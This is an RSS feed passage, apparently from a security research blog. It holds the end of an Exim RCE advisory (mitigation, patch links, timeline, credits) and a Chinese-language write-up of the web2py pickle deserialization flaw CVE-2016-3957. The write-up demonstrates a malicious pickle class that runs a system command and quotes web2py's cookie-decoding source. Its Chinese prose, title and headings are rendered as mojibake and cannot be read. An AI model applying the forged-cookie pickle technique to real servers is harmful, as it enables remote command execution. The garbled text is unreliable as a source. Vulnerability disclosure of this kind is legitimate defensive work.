    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chunking_advertise_hosts =
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Update to 4.89.1 version&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16943 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/4090d62a4b25782129cc1643596dc2f6e8f63bde&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Patch of CVE-2017-16944 released &lt;a href=&quot;https://git.exim.org/exim.git/commitdiff/178ecb70987f024f0e775d87c2f8b2cf587dd542&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;23 November, 2017 09:40 Report to Exim Bugzilla&lt;/li&gt;
  &lt;li&gt;25 November, 2017 16:27 CVE-2017-16943 Patch released&lt;/li&gt;
  &lt;li&gt;28 November, 2017 16:27 CVE-2017-16944 Patch released&lt;/li&gt;
  &lt;li&gt;3 December, 2017 13:15 Send an advisory release notification to Exim and wait for reply until now&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;remarks&quot;&gt;Remarks&lt;/h4&gt;
&lt;p&gt;While we were trying to report these bugs to exim, we could not find any method for security report. Therefore, we followed the link on the official site for bug report and found the security option. Unexpectedly, the Bugzilla posts all bugs publicly and therefore the PoC was leaked. Exim team responded rapidly and improved their security report process by adding a notification for security reports in reaction to this.&lt;/p&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://bugs.exim.org/show_bug.cgi?id=2199
https://bugs.exim.org/show_bug.cgi?id=2201
https://nvd.nist.gov/vuln/detail/CVE-2017-16943
https://nvd.nist.gov/vuln/detail/CVE-2017-16944
https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WEB2PY ÂèçÂ∫èÂàóÂåñÁöÑÂÆâÂÖ®ÂïèÈ°åÔºçCVE-2016-3957</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;Âú®‰∏ÄÊ¨°Êª≤ÈÄèÊ∏¨Ë©¶ÁöÑÈÅéÁ®ã‰∏≠ÔºåÊàëÂÄëÈÅáÂà∞‰∫ÜÁî® web2py Ê°ÜÊû∂Âª∫ÊßãÁöÑÊáâÁî®Á®ãÂºè„ÄÇÁÇ∫‰∫ÜÊàêÂäüÊª≤ÈÄèÁõÆÊ®ôÔºåÊàëÂÄëÁ†îÁ©∂‰∫Ü web2pyÔºåÁôºÁèæË©≤Ê°ÜÊû∂ÁØÑ‰æãÊáâÁî®Á®ãÂºè‰∏≠Â≠òÂú®‰∏âÂÄãË≥áË®äÊ¥©ÊºèÂïèÈ°åÔºåÈÄô‰∫õÊ¥©ÊºèÈÉΩÊúÉÂ∞éËá¥ÈÅ†Á´ØÂëΩ‰ª§Âü∑Ë°å (RCE)„ÄÇÁî±ÊñºÁØÑ‰æãÊáâÁî®Á®ãÂºèÈ†êË®≠ÊòØÈñãÂïüÁöÑÔºåËã•Ê≤íÊúâÊâãÂãïÈóúÈñâÔºåÊîªÊìäËÄÖÂèØ‰ª•Áõ¥Êé•Âà©Áî®Ê¥©ÊºèË≥áË®äÂèñÂæóÁ≥ªÁµ±Âü∑Ë°åÊ¨äÈôê„ÄÇÈÄô‰∫õÂïèÈ°åÁ∑®ËôüÂàÜÂà•ÁÇ∫ÔºöCVE-2016-3952„ÄÅCVE-2016-3953„ÄÅCVE-2016-3954„ÄÅCVE-2016-3957„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ËÉåÊôØËÄÅÁîüÂ∏∏Ë´áÁöÑ-pickle-code-execution&quot;&gt;ËÉåÊôØÔºçËÄÅÁîüÂ∏∏Ë´áÁöÑ Pickle Code Execution&lt;/h3&gt;

&lt;p&gt;Âú®ÁπºÁ∫åË™™ÊòéÂâçÂøÖÈ†àË¶ÅÂÖàË™çÁü•‰ªÄÈ∫ºÊòØÂèçÂ∫èÂàóÂåñÁöÑÂÆâÂÖ®ÂïèÈ°åÔºüÂèçÂ∫èÂàóÂåñÁöÑÂÆâÂÖ®ÂïèÈ°åÂú®Êú¨Ë≥™‰∏äÂÖ∂ÂØ¶ÊòØÁâ©‰ª∂Ê≥®ÂÖ•ÔºåÂÆÉÁöÑÂö¥ÈáçÊÄßÂèñÊ±∫ÊñºÊâÄÊ≥®ÂÖ•ÁöÑÁâ©‰ª∂Êú¨Ë∫´ÊòØÂê¶ÊúÉÈÄ†ÊàêÂç±Èö™Ë°åÁÇ∫Ôºå‰æãÂ¶ÇËÆÄÂØ´Ê™î„ÄÇ‰∏ÄËà¨‰æÜË™™Ë¶ÅÈÄèÈÅéÂèçÂ∫èÂàóÂåñÂª∫Êßã‰∏ÄÂÄãÊàêÂäüÁöÑÊîªÊìäÊúâÂÖ©ÂÄãË¶ÅÈªûÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊòØÂê¶ÂèØÊéßÂà∂ÁõÆÊ®ôÊâÄË¶ÅÂèçÂ∫èÂàóÂåñÁöÑÂ≠ó‰∏≤„ÄÇ&lt;/li&gt;
  &lt;li&gt;Âç±Èö™Ë°åÁÇ∫Âú®ÂèçÂ∫èÂàóÂåñÂæåÊòØÂê¶ÊúÉË¢´Âü∑Ë°å„ÄÇÈÄôÂú®ÂØ¶Âãô‰∏äÂ§ßÊ¶ÇÊúâ‰∏ãÈù¢ÂÖ©Á®ÆÊÉÖÂΩ¢Ôºö
    &lt;ul&gt;
      &lt;li&gt;Âç±Èö™Ë°åÁÇ∫ÊòØÂØ´Âú®È≠îÊ≥ïÊñπÊ≥ï (Magic Method) Ë£°Èù¢Ôºå‰æãÂ¶Ç PHP ÁöÑ __construct Âú®Áâ©‰ª∂ÁîüÊàêÊôÇ‰∏ÄÂÆöÊúÉÂü∑Ë°å„ÄÇ&lt;/li&gt;
      &lt;li&gt;ÂèçÂ∫èÂàóÂåñÂæåË¶ÜËìãÊó¢ÊúâÁâ©‰ª∂ÔºåÂ∞éËá¥Ê≠£Â∏∏Á®ãÂºèÊµÅÁ®ãÂá∫ÁèæÂç±Èö™ÁµêÊûú„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂèçÂ∫èÂàóÂåñÁöÑÂïèÈ°åÂú®ÊØèÂÄãÁ®ãÂºèË™ûË®ÄÈÉΩÊúÉÁôºÁîüÔºå‰ΩÜÈÄöÂ∏∏ÈúÄË¶ÅÊê≠ÈÖçÁúãÁ®ãÂºèÁ¢ºÊãºÊπäÂá∫ÂèØ‰ª•Áî®ÁöÑÊîªÊìäÊµÅÁ®ãÔºåÊØîËºÉÈõ£Âà©Áî®„ÄÇ‰∏çÈÅéÔºåÊüê‰∫õÂØ¶‰ΩúÂ∫èÂàóÂåñÁöÑÂáΩÂºèÂ∫´ÊúÉÂ∞áÁ®ãÂºèÈÇèËºØ‰πüÂ∫èÂàóÂåñÊàêÂ≠ó‰∏≤ÔºåÂõ†Ê≠§ÊîªÊìäËÄÖÂèØ‰ª•Ëá™ÂÆöÁæ©Áâ©‰ª∂Áõ¥Êé•‰ΩøÁî®Ôºå‰∏çÂÜçÈúÄË¶ÅÊãºÊπäÔºå‰æãÂ¶Ç‰ªäÂ§©Ë¶ÅÊèêÁöÑ Python Pickle„ÄÇ&lt;/p&gt;

&lt;p&gt;Áõ¥Êé•ËàâÂÄã Pickle ÁöÑ‰æãÂ≠êÂ¶Ç‰∏ãÔºåÊàëÂÄëË£ΩÈÄ†‰∫Ü‰∏ÄÂÄãÊúÉÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo success&lt;/code&gt; ÁöÑÁâ©‰ª∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;Ôºå‰∏¶‰∏îÂ∫èÂàóÂåñÊàêÂ≠ó‰∏≤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;cposix\nsystem\np1\n(S&apos;echo success&apos;\np2\ntp3\nRp4\n.&quot;&lt;/code&gt;„ÄÇÁï∂ÂèóÂÆ≥ËÄÖÂèçÂ∫èÂàóÂåñÈÄôÂÄãÂ≠ó‰∏≤ÔºåÂç≥Ëß∏ÁôºÂü∑Ë°åË©≤Á≥ªÁµ±Êåá‰ª§ÔºåÂõ†Ê≠§Âç∞Âá∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;success&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;cposix&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(S&apos;echo success&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tp3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rp4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÈÄôÂ∞±ÊòØ Pickle Ë™§Áî®ÂèçÂ∫èÂàóÂåñÊâÄÈÄ†ÊàêÁöÑÂëΩ‰ª§Âü∑Ë°åÈ¢®Èö™„ÄÇÊîªÊìäËÄÖÂæàÂÆπÊòìÂèØ‰ª•Áî¢Áîü‰∏ÄÂÄãÂê´Êúâ‰ªªÊÑèÂëΩ‰ª§Âü∑Ë°åÁöÑÂ∫èÂàóÂåñÂ≠ó‰∏≤ÔºåÈÄ≤ËÄåËÆìÂèóÂÆ≥ËÄÖÂú®ÈÄ≤Ë°åÂèçÂ∫èÂàóÂåñÁöÑÈÅéÁ®ã‰∏≠Ëß∏ÁôºÂü∑Ë°åÊÉ°ÊÑèÂëΩ‰ª§„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂèçÂ∫èÂàóÂåñ--Â∫èÂàóÂåñÂ≠ó‰∏≤ÂèØÊéß&quot;&gt;ÂèçÂ∫èÂàóÂåñ Ôºã Â∫èÂàóÂåñÂ≠ó‰∏≤ÂèØÊéß&lt;/h3&gt;

&lt;p&gt;Êú¨Ê¨°ÁôºÁèæÁöÑÂïèÈ°å‰∏ªË¶Å‰æÜËá™ web2py Êú¨Ë∫´ÁöÑ session cookie ‰ΩøÁî® Pickle ËôïÁêÜÂ∫èÂàóÂåñÈúÄÊ±Ç (CVE-2016-3957)ÔºåËÄå‰∏îÂõ†ÁÇ∫ session cookie ÁöÑÂä†ÂØÜÂ≠ó‰∏≤Âõ∫ÂÆö (CVE-2016-3953)ÔºåÊîªÊìäËÄÖÂèØ‰ªªÊÑèÂÅΩÈÄ†ÊÉ°ÊÑèÁöÑÂ∫èÂàóÂåñÂ≠ó‰∏≤ÈÄ†ÊàêÂâçÈù¢ÊâÄ‰ªãÁ¥πÁöÑÂëΩ‰ª§Âü∑Ë°åÈ¢®Èö™„ÄÇÁ¥∞ÁØÄÂ¶Ç‰∏ã„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3957&quot;&gt;CVE-2016-3957&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;

&lt;p&gt;web2py ÁöÑÊáâÁî®Á®ãÂºèÂ¶ÇÊûú‰ΩøÁî® cookie ‰æÜÂÑ≤Â≠ò session Ë≥áË®äÔºåÈÇ£È∫ºÂú®ÊØèÊ¨°Êé•Âà∞‰ΩøÁî®ËÄÖË´ãÊ±ÇÊôÇÊúÉÂ∞á session cookie Áî®‰∏ÄÂÄã secure_loads ÂáΩÂºèÂ∞á cookie ÂÖßÂÆπËÆÄÂÖ•„ÄÇ [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;cookie&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# check if there is session data in cookies
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;secure_loads ÂáΩÂºèÂÖßÂÆπÂ¶Ç‰∏ãÔºåÂú®‰∏ÄÈÄ£‰∏≤Ëß£ÂØÜÂæåÊúÉÁî® pickle.loads ÊñπÊ≥ïÂ∞áËß£ÂØÜÂÖßÂÆπÂèçÂ∫èÂàóÂåñÔºåÂú®ÈÄôË£°Á¢∫ÂÆö cookie ÂÖßÂÆπÊúÉ‰ΩøÁî® Pickle ËôïÁêÜ„ÄÇ[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
